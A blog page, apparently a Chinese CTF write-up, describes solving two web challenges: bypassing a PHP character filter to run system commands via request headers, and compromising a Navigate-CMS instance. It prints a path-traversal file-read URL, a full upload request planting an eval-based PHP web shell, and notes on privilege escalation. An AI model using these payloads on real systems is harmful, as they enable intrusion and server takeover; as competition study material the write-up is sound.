@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#6c599f">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/./images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/./images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/./images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/./images/safari-pinned-tab-next.svg" color="#6c599f">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=EB Garamond, Noto Serif SC:300,300italic,400,400italic,700,700italic|Long Cang:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"localhost","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="其实这次web题目质量一般，可能web只有一道题目做起来让人觉得知识点和考察方式都很好，既简单又困难的那种感觉吧，web题目应该是AK了，但是有一部分没啥营养，这里就记录下两道题目： 1、简单的php  2、高手高手高高手 简单的php这道题目其实以前也遇到过，不过这里过滤了更多的东西，中心思想还是一致的，我们首先看代码： 123456789&lt;?phpshow_source(__FILE__">
+<meta property="og:type" content="article">
+<meta property="og:title" content="鹏程杯CTF-两道有意思的题目">
+<meta property="og:url" content="http://localhost:4000/posts/PCL-CTF-WEB2/">
+<meta property="og:site_name" content="匆匆那年">
+<meta property="og:description" content="其实这次web题目质量一般，可能web只有一道题目做起来让人觉得知识点和考察方式都很好，既简单又困难的那种感觉吧，web题目应该是AK了，但是有一部分没啥营养，这里就记录下两道题目： 1、简单的php  2、高手高手高高手 简单的php这道题目其实以前也遇到过，不过这里过滤了更多的东西，中心思想还是一致的，我们首先看代码： 123456789&lt;?phpshow_source(__FILE__">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-05T07:27:28.000Z">
+<meta property="article:modified_time" content="2022-07-05T08:27:20.189Z">
+<meta property="article:author" content="Geez">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://localhost:4000/posts/PCL-CTF-WEB2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>鹏程杯CTF-两道有意思的题目 | 匆匆那年</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">匆匆那年</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">钟声敲在你我耳边</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-fas fa-home"></i>首页</a>
+
+  </li>
+        
+            
+  <li class="menu-item menu-item-overview">
+
+    <a href="/overview/" rel="section"><i class="fa fa-fw fa-fas fa-archive"></i>总览</a>
+
+  </li>
+
+
+      
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-fas fa-location-arrow"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-friends">
+
+    <a href="/friends/" rel="section"><i class="fa fa-fw fa-fas fa-heart"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/posts/PCL-CTF-WEB2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Geez">
+      <meta itemprop="description" content="黑客,诗人,养龟仔">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="匆匆那年">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          鹏程杯CTF-两道有意思的题目
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发布：</span>
+
+              <time title="创建时间：2022-07-05 15:27:28" itemprop="dateCreated datePublished" datetime="2022-07-05T15:27:28+08:00">2022-07-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类：</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/overview/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>其实这次web题目质量一般，可能web只有一道题目做起来让人觉得知识点和考察方式都很好，既简单又困难的那种感觉吧，web题目应该是AK了，但是有一部分没啥营养，这里就记录下两道题目：</p>
+<p>1、简单的php </p>
+<p>2、高手高手高高手</p>
+<h2 id="简单的php"><a href="#简单的php" class="headerlink" title="简单的php"></a>简单的php</h2><p>这道题目其实以前也遇到过，不过这里过滤了更多的东西，中心思想还是一致的，我们首先看代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>第一个考点是无符号执行，就是基本各种符号都被过滤了，我们直接来看下还剩什么，一般剩什么就是考什么：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$code</span>=<span class="string">&quot;～1234567890-=qwertyuiop[]asdfghjkl;&#x27;zxcvbnm,./!@#$%^&amp;*()_+QWERTYUIOP&#123;&#125;ASDFGHJKL:\\ \&quot;ZXCVBNM&lt;&gt;?&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$code</span>[<span class="variable">$i</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据上述代码可得到可用字符如下：[];!@#%*()_{}:&lt;</p>
+<p>基本上题目要不留一个 ^ 让你异或出来～继续拼装(也可以异或其他出来，全凭想象)，要不就给你留下来这个～。这里有这个～，直接就可以开干，首先基本上可见字符的取反都是不可见字符，不可见字符当然符合这个无字符正则，所以可以用不可见字符取反绕过正则，这里也写一下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//system(end(getheaders()))</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;end&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&quot;getheaders&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>第二个考点是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>)</span><br></pre></td></tr></table></figure>
+
+<p>也就是payload经过循环过滤后仅剩下;  也就是payload只能是无参的形式：a(abc(dsada())); 这种</p>
+<p>那我们就用一些特殊函数：</p>
+<p>getheaders获取headers信息，end是获取最后一个，system直接系统命令，我们只需把需要执行的命令放入header的最后一个字段就行了。system(end(getheaders())) </p>
+<p>![image-20220705155003413](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220705155003413.png)</p>
+<h2 id="高手高手高高手"><a href="#高手高手高高手" class="headerlink" title="高手高手高高手"></a>高手高手高高手</h2><p>由于没有环境了可能只是说一下思路和当时遇到的问题。</p>
+<p>首先这道题目是Navigate-CMS 目录有git泄漏：</p>
+<p>![image-20220705160301716](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220705160301716.png)</p>
+<p>但是这里的git泄漏我并没有拿到源码，不知道是不是有什么奇怪知识点。所以就去github上找了对应的<a target="_blank" rel="noopener" href="https://github.com/NavigateCMS/Navigate-CMS">Navigatecms</a> 源码</p>
+<p>通过搜索最近的漏洞详情，发现2022年刚爆出一个任意文件读取的漏洞提醒，根据代码审计了对应代码发现在navigate_download.php存在id参数的任意文件读取：</p>
+<p>payload：<a target="_blank" rel="noopener" href="http://192.168.1.xxx/navigate_download.php?id=../../../../../../../../../../../../../../../etc/passwd">http://192.168.1.xxx/navigate_download.php?id=../../../../../../../../../../../../../../../etc/passwd</a></p>
+<p>但是没什么用 flag不在根目录。</p>
+<p>然后搜索到另一个任意文件覆盖上传：</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/45561">https://www.exploit-db.com/exploits/45561</a></p>
+<p>但是因为github的代码是最新的所以已经修复过了，只能通过上面的任意文件读取拿到navigate_upload.php源码：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.xxx/navigate_download.php?id=../../../../../../../../../../../../../../../var/www/html/navigate_upload.php">http://192.168.1.xxx/navigate_download.php?id=../../../../../../../../../../../../../../../var/www/html/navigate_upload.php</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>拿到源码发现漏洞存在于139行</p>
+<p>![image-20220705161744409](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220705161744409.png)</p>
+<p>engine&#x3D;picnik时可以进行文件覆盖，但是这里过滤了..&#x2F; 仍然很好绕过 通过…&#x2F;.&#x2F;得到..&#x2F;，所以我们直接覆盖navigate_info.php这个文件的内容：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/navigate_upload.php?session_id=vcu80v6qbgcjrajhka5acjh887&amp;engine=picnik&amp;id=../../../navigate_info.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.116</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>519</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarysFc8yFB2XMDgA35C</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.116</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.116/navigate.php?fid=websites&amp;act=2&amp;id=1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>NVSID_7da51544=vcu80v6qbgcjrajhka5acjh887; PHPSESSID=vcu80v6qbgcjrajhka5acjh887; navigate-tinymce-scroll=%7B%7D; navigate-user=efc2e3b89151d3e84e01f5fc10d841703bf119dd; navigate-language=en; navigate-tree-structure-1=%5B%22node-0%22%2C%22node-2%22%5D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;name&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">12222345</span>.php</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;chunk&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">0</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;chunks&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">1</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;122245.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">phpinfo</span>();</span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmdd5556&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C--</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到shell我们发现根目录存在I_want_capture_the_flag二进制文件,但是运行说什么皇家赌场还没下线，不给flag，二进制逆向发现回去判断两个文件存不存在，如果不存在再通过一系列运算给出flag:</p>
+<p>![image-20220705162041847](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220705162041847.png)</p>
+<p>现在我们知道需要删除&#x2F;var&#x2F;www&#x2F;html&#x2F;bocai.* ,但是我们并没有权限，这里我们就需要提权。首先我们根据网站目录下的隐藏php文件-&gt;</p>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;.my_date.php  的提示拿到账号密码 并可以ssh登陆 。登陆后发现账户下面存在.get_root目录里面有现成的提权脚本，先利用源码中的配置文件泄漏的用户navigate 运行mysql-privesc-race拿到mysql权限（时间很长，要等很久要有耐心），再利用得到的mysql账户权限运行mysql-chowned.sh，拿到root。（这两个提权网上可以搜索到，这里不再赘述，第一步提权有条件竞争需要等待较长时间）</p>
+<p>拿到root后我们去删除&#x2F;var&#x2F;www&#x2F;html&#x2F;bocai.*  依然不行，后来发现文件存在a属性，通过修改属性即可删除：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lsattr bocai.png</span><br><span class="line">chattr -a bocai.png</span><br><span class="line">lsattr bocai.html</span><br><span class="line">chattr -a bocai.html</span><br></pre></td></tr></table></figure>
+
+<p>最后我们删除bocai.* 运行&#x2F;var&#x2F;www&#x2F;html&#x2F;I<strong>want</strong>capture<strong>the</strong>flag拿到flag</p>
+<p><strong>拓展</strong></p>
+<p>Linux chattr命令用于改变文件属性。</p>
+<p>这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式：</p>
+<p>a：让文件或目录仅供附加用途。<br>b：不更新文件或目录的最后存取时间。<br>c：将文件或目录压缩后存放。<br>d：将文件或目录排除在倾倒操作之外。<br>i：不得任意更动文件或目录。<br>s：保密性删除文件或目录。<br>S：即时更新文件或目录。<br>u：预防意外删除。</p>
+
+    </div>
+
+    
+    
+    
+
+
+<span style="margin-top:30px; color:var(--blockquote-color); font-size:0.85em">
+        <br>
+        <span class="post-end-item" title="copyright"">
+            <span class="post-end-item-icon" style="margin-right: 3px">
+                <i class="fab fa-fw fa-creative-commons"></i>
+            </span>
+            <span class="post-end-item-text">采用署名-非商业性使用-相同方式共享 4.0（CC BY-NC-SA 4.0）许可协议</span>
+        </span>
+</span>
+
+
+
+
+
+<div class="donations">
+    <div class="donation-label">「分享也是一种学习」</div>
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/overview/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/android_wechat_minipro_burp/" rel="prev" title="微信最新版小程序burp抓包">
+      <i class="fa fa-chevron-left"></i> 微信最新版小程序burp抓包
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84php"><span class="nav-text">简单的php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E6%89%8B%E9%AB%98%E6%89%8B%E9%AB%98%E9%AB%98%E6%89%8B"><span class="nav-text">高手高手高高手</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Geez"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Geez</p>
+  <div class="site-description" itemprop="description">黑客,诗人,养龟仔</div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/geeeez/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;geeeez&#x2F;" rel="noopener" target="_blank"><i class="fa fa-fw fa-fab fa-github"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-fas fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Geez</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">133k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:01</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
